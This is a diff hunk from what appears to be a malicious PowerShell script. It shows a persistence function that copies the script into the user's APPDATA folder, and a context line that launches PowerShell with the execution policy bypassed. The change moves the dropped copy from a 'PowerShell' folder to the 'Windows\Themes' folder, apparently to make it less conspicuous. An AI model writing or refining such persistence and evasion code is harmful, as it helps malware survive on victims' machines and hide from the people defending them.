@@ -759,7 +759,7 @@ Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C Add-Type -Assemb
 # --------------------------------------------------------------- PERSISTANCE FUNCTIONS ------------------------------------------------------------------------
 
 Function AddPersistance{
-    $newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
+    $newScriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
     $scriptContent | Out-File -FilePath $newScriptPath -force
     sleep 1
     if ($newScriptPath.Length -lt 100){
